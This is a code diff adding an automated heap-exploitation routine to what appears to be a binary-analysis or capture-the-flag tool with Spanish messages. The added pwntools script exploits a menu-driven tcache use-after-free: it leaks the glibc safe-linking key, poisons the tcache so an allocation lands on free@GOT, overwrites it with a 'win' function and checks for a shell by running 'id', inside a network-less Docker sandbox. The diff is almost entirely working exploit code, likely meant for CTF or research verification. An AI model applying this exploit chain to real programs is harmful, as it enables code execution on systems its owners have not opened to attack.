@@ -50,6 +50,91 @@ def autoheap(binary: str) -> dict:
                     else "no se disparo corrupcion con las entradas de prueba"}
 
 
+# Heap-to-shell driver for the common menu-driven tcache-UAF shape (new/free/edit/show) with a
+# gift `win` and a writable free@GOT (no-PIE / partial RELRO), e.g. the `heapexp` sample. It
+# defeats glibc safe-linking WITHOUT needing exact heap offsets: freeing one chunk into an empty
+# tcache bin sets its fd = mangle(NULL) = (&chunk >> 12), so `show` leaks that key directly;
+# poisoning then uses fd = key ^ target. Runs in the binoracle-pwn sandbox (ASLR off).
+_HEAP_SHELL_DRIVER = r'''
+import sys
+from pwn import *
+elf = ELF(sys.argv[1], checksec=False); context.binary = elf; context.log_level = "error"
+win = (elf.symbols or {}).get("win")
+free_got = (elf.got or {}).get("free")
+if not win or not free_got:
+    print("NOT_APPLICABLE (no win / no free@GOT)"); sys.exit(1)
+PROMPT = b"> "
+def choose(io, c, idx=None, data=None):
+    io.sendlineafter(PROMPT, str(c).encode())
+    if idx is not None:
+        io.sendline(str(idx).encode())     # menu reads the index on the next line (no prompt)
+    if data is not None:
+        io.send(data)
+try:
+    io = process([elf.path], aslr=False)
+    # Phase A -- leak the safe-linking key: new(0); free(0) (empty bin -> fd=mangle(NULL));
+    # show(0) returns (&0 >> 12); then take chunk 0 back so the bin is empty again.
+    choose(io, 1, 0); choose(io, 2, 0)
+    choose(io, 4, 0)
+    key = u64(io.recv(8).ljust(8, b"\x00"))
+    choose(io, 1, 0)                        # re-allocate index 0 (tcache empty, count 0)
+    # Phase B -- poison: free two 0x20 chunks (count 2), overwrite head fd with mangle(free_got),
+    # malloc twice so the 2nd allocation lands on free@GOT, then overwrite free@GOT with win.
+    choose(io, 1, 1)
+    choose(io, 2, 1); choose(io, 2, 0)      # tcache head = 0, count = 2
+    choose(io, 3, 0, p64(key ^ free_got).ljust(0x20, b"\x00"))   # UAF edit: fd(0) = mangle(free_got)
+    choose(io, 1, 2)                        # malloc -> chunk 0
+    choose(io, 1, 3)                        # malloc -> free@GOT  (chunks[3] = &free@GOT)
+    choose(io, 3, 3, p64(win).ljust(0x20, b"\x00"))              # *free@GOT = win
+    choose(io, 2, 2)                        # free(valid chunk) -> calls free@GOT -> win() -> /bin/sh
+    io.sendline(b"echo BINORACLE_PWNED; id")
+    out = io.recvrepeat(1.5)
+    io.close()
+    ok = b"BINORACLE_PWNED" in out or b"win reached" in out or b"uid=" in out
+    print("VERIFIED key=%#x free_got=%#x win=%#x" % (key, free_got, win) if ok else "NOT_VERIFIED")
+except Exception as e:
+    print("ERROR", e)
+    sys.exit(1)
+'''
+
+
+def autoheap_shell(binary: str) -> dict:
+    """Drive a menu tcache-UAF (heapexp shape) to a verified shell via tcache poisoning +
+    free@GOT overwrite. Needs a `win` and a writable free@GOT (no-PIE). Runs in the
+    binoracle-pwn sandbox; degrades cleanly if Docker or the image is absent."""
+    if not shutil.which("docker"):
+        return {"ok": False, "note": "docker no disponible"}
+    if subprocess.run(["docker", "image", "inspect", "binoracle-pwn"],
+                      capture_output=True).returncode != 0:
+        return {"ok": False, "note": "falta la imagen 'binoracle-pwn' (make pwn-image)"}
+    d = os.path.dirname(os.path.abspath(binary)); name = os.path.basename(binary)
+    if not os.path.isdir(d):
+        return {"ok": False, "note": f"directorio inexistente: {d}"}
+    drv = os.path.join(d, ".binoracle_heap.py")
+    try:
+        with open(drv, "w") as f:
+            f.write(_HEAP_SHELL_DRIVER)
+    except OSError as e:
+        return {"ok": False, "note": f"no se pudo escribir el driver: {e}"}
+    try:
+        r = subprocess.run(
+            ["docker", "run", "--rm", "--platform", "linux/amd64", "--network", "none",
+             "--memory", "512m", "--pids-limit", "256", "--security-opt", "seccomp=unconfined",
+             "-v", d + ":/w", "-w", "/w", "binoracle-pwn", "python3", ".binoracle_heap.py", name],
+            capture_output=True, text=True, timeout=200)
+        out = r.stdout + r.stderr
+    except subprocess.TimeoutExpired:
+        out = "[timeout]"
+    finally:
+        try: os.unlink(drv)
+        except OSError: pass
+    verified = "VERIFIED" in out and "NOT_VERIFIED" not in out
+    line = next((l for l in out.splitlines() if l.startswith("VERIFIED")), "")
+    return {"ok": True, "verified": verified, "detail": line, "output": out[-600:],
+            "note": "tcache-UAF -> free@GOT=win -> shell (sandbox)" if verified
+                    else "no verificado (revisa alineacion/glibc o formato del menu)"}
+
+
 def render_heap(r: dict) -> str:
     out = ["## Heap dinamico (confirmacion por ejecucion)\n"]
     if not r.get("ok"):
